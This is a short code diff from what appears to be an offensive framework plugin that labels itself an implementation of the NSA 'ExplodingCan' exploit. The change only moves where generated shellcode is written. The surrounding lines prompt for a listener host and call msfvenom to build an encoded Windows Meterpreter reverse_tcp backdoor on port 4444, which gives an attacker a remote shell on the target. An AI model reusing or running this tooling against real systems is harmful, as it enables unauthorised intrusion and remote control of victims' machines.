@@ -17,7 +17,7 @@ from urlparse import urlparse
 from struct import pack
 
 plugin_description = "Author: danigargu\nAbout: An implementation of NSA's ExplodingCan exploit"
-shelly = "storage/shellcode"
+shelly = "shellcode"
 intname = "rsf"
 det = sys.argv[0]
 fin = det.split('.')[-2]
@@ -79,7 +79,7 @@ def aner():
     print "\033[1;94m[?]\033[1;m Listener :: Enter your listening host to get connection back from backdoor"
     lhost = raw_input('\033[1;92m[+]\033[1;m listener: [' + shellez + ']: ') or shellez
     print "\033[1;94m[?]\033[1;m Generating backdoor"
-    os.system("msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=" + lhost + " LPORT=4444 >storage/shellcode &>/dev/null")
+    os.system("msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=" + lhost + " LPORT=4444 >shellcode &>/dev/null")
     print "\033[1;94m[?]\033[1;m Configuring Plugin"
     time.sleep(1)
     print ""
